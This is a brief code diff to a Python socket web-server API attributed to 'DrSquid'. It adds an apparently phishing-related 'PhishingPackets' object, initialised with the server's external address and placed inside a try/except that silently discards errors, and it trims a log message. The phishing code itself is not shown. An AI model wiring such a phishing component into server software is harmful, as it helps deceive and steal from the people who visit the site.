@@ -29,6 +29,10 @@ Web-Server API by DrSquid"""
             self.external_ip = self.ip
         if self.external_port is None:
             self.external_port = self.port
+        try:
+            self.phishing_packets = PhishingPackets.Phishing_Packets(self.external_ip, self.external_port)
+        except Exception as e:
+            pass
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.homepage = "/home"
         self.ipban_list = []
@@ -83,7 +87,7 @@ Welcome to this website.
         self.server.bind((self.ip, self.port))
         self.listen()
     def listen(self):
-        self.log(f"[+] Server is listening on {self.ip}:{self.port}.")
+        self.log(f"Server is listening on {self.ip}:{self.port}.")
         while True:
             try:
                 self.server.listen()
